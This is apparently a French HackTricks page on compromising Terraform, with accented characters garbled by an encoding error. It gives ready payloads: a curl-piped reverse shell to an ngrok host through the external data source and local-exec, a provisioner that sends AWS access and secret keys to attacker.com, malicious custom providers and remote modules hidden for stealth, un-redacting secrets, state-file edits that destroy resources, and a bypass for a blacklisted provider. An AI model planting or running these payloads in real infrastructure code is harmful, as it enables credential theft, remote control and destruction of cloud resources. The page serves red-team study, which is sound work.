# S√©curit√© Terraform

<details>

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Informations de base

[Depuis la documentation :](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform est un outil **d'infrastructure en tant que code** qui vous permet de d√©finir √† la fois des **ressources cloud et sur site** dans des fichiers de configuration lisibles par l'homme que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un flux de travail coh√©rent pour provisionner et g√©rer toute votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants de bas niveau tels que le calcul, le stockage et les ressources r√©seau, ainsi que des composants de haut niveau tels que les entr√©es DNS et les fonctionnalit√©s SaaS.

### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs interfaces de programmation d'applications (API). Les fournisseurs permettent √† Terraform de fonctionner avec pratiquement n'importe quelle plateforme ou service disposant d'une API accessible.

![](<../.gitbook/assets/image (177).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 fournisseurs** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre continue de cro√Ætre. Vous pouvez trouver tous les fournisseurs disponibles publiquement sur le [Registre Terraform](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le flux de travail principal de Terraform se compose de trois √©tapes :

* **√âcrire :** Vous d√©finissez des ressources, qui peuvent √™tre r√©parties sur plusieurs fournisseurs cloud et services. Par exemple, vous pourriez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau de cloud priv√© virtuel (VPC) avec des groupes de s√©curit√© et un √©quilibreur de charge.
* **Planifier :** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
* **Appliquer :** Sur approbation, Terraform effectue les op√©rations propos√©es dans le bon ordre, en respectant les d√©pendances entre les ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et modifiez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de mettre √† l'√©chelle les machines virtuelles.

![](<../.gitbook/assets/image (215).png>)

## Laboratoire Terraform

Il suffit d'installer Terraform sur votre ordinateur.

Voici un [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) et voici la [meilleure fa√ßon de t√©l√©charger Terraform](https://www.terraform.io/downloads).

## RCE dans Terraform

Terraform **n'a pas de plateforme exposant une page web ou un service r√©seau** que nous pouvons √©num√©rer, donc, le seul moyen de compromettre Terraform est de **pouvoir ajouter/modifier des fichiers de configuration Terraform**.

Cependant, Terraform est un **composant tr√®s sensible** √† compromettre car il aura un **acc√®s privil√©gi√©** √† diff√©rents emplacements pour fonctionner correctement.

Le principal moyen pour un attaquant de pouvoir compromettre le syst√®me o√π Terraform s'ex√©cute est de **compromettre le d√©p√¥t qui stocke les configurations Terraform**, car √† un moment donn√©, elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent automatiquement terraform plan/apply apr√®s la cr√©ation d'une PR**, telles que **Atlantis** :

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Si vous parvenez √† compromettre un fichier Terraform, il existe diff√©rentes fa√ßons de r√©aliser une RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans Terraform et les d√©veloppeurs/les solutions utilisant Terraform l'appellent tout le temps, donc le **moyen le plus simple d'obtenir une RCE** est de vous assurer de corrompre un fichier de configuration Terraform qui ex√©cutera des commandes arbitraires dans un `terraform plan`.

#### Utilisation d'un fournisseur externe

Terraform propose le fournisseur [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) qui fournit un moyen d'interfacer entre Terraform et des programmes externes. Vous pouvez utiliser la source de donn√©es `external` pour ex√©cuter du code arbitraire lors d'un `plan`.

Injecter dans un fichier de configuration Terraform quelque chose comme ce qui suit ex√©cutera un shell invers√© lors de l'ex√©cution de `terraform plan` :
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Utilisation d'un fournisseur personnalis√©

Un attaquant pourrait envoyer un [fournisseur personnalis√©](https://learn.hashicorp.com/tutorials/terraform/provider-setup) au [Registre Terraform](https://registry.terraform.io/) puis l'ajouter au code Terraform dans une branche de fonctionnalit√© ([exemple d'ici](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Le fournisseur est t√©l√©charg√© dans l'`init` et ex√©cutera le code malveillant lorsque `plan` est ex√©cut√©

Vous pouvez trouver un exemple dans [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Utilisation d'une r√©f√©rence externe

Les deux options mentionn√©es sont utiles mais pas tr√®s furtives (la deuxi√®me est plus furtive mais plus complexe que la premi√®re). Vous pouvez effectuer cette attaque de mani√®re encore plus **furtive**, en suivant ces suggestions :

* Au lieu d'ajouter directement le shell invers√© dans le fichier terraform, vous pouvez **charger une ressource externe** contenant le shell invers√© :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code de rev shell dans [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonction **ref** pour masquer le **code de rev shell Terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Application de Terraform

L'application de Terraform sera ex√©cut√©e pour appliquer tous les changements, vous pouvez √©galement en abuser pour obtenir une ex√©cution de code √† distance en injectant **un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Assurez-vous simplement qu'une charge utile comme celles ci-dessous se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te en utilisant des r√©f√©rences externes**.

## Exposition de secrets

Vous pouvez avoir les **valeurs secr√®tes utilis√©es par terraform expos√©es** en ex√©cutant `terraform apply` en ajoutant quelque chose comme ceci au fichier terraform :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abus des fichiers d'√©tat Terraform

Dans le cas o√π vous avez un acc√®s en √©criture sur les fichiers d'√©tat Terraform mais ne pouvez pas modifier le code Terraform, [**cette recherche**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) offre quelques options int√©ressantes pour tirer parti du fichier :

### Suppression de ressources <a href="#deleting-resources" id="deleting-resources"></a>

Il existe 2 fa√ßons de d√©truire des ressources :

1. **Ins√©rer une ressource avec un nom al√©atoire dans le fichier d'√©tat pointant vers la vraie ressource √† d√©truire**

Comme Terraform verra que la ressource ne devrait pas exister, il la d√©truira (en suivant l'ID de la vraie ressource indiqu√©e). Exemple de la page pr√©c√©dente :
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifier la ressource √† supprimer de mani√®re √† ce qu'il ne soit pas possible de la mettre √† jour (elle sera donc supprim√©e et recr√©√©e)**

Pour une instance EC2, modifier le type de l'instance est suffisant pour que Terraform la supprime et la recr√©e.

### RCE

Il est √©galement possible de [cr√©er un fournisseur personnalis√©](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) et simplement remplacer l'un des fournisseurs dans le fichier d'√©tat Terraform par un fournisseur malveillant ou ajouter une ressource vide avec le fournisseur malveillant. Exemple de la recherche originale:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Remplacer le fournisseur sur liste noire

Dans le cas o√π vous rencontrez une situation o√π `hashicorp/external` a √©t√© mis sur liste noire, vous pouvez r√©impl√©menter le fournisseur `external` en suivant les √©tapes suivantes. Remarque : Nous utilisons un fork du fournisseur externe publi√© par https://registry.terraform.io/providers/nazarewk/external/latest. Vous pouvez √©galement publier votre propre fork ou r√©impl√©mentation.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ensuite, vous pouvez utiliser `external` comme d'habitude.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Outils d'Audit

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utilise l'analyse statique de votre code terraform pour rep√©rer les configurations incorrectes potentielles.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan est un analyseur de code statique pour l'Infrastructure en tant que Code.

## R√©f√©rences

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
